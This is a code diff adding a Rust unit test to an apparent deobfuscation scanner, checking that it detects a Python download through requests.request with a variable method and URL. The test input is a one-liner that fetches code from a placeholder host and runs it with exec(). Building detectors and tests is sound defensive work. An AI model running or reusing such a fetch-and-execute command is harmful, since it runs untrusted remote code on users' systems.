@@ -11308,6 +11308,38 @@ $urlzip = "https://ps.example/stage.zip""#,
     }
 
     #[test]
+    fn python_requests_request_get_variable_method_and_url_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import requests; m = 'GET'; u = 'https://py.example/request-method-var'; exec(requests.request(m, u).text)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/request-method-var" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python requests.request variable method/URL: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/request-method-var")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python requests.request variable method/URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn python_requests_assigned_request_alias_get_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
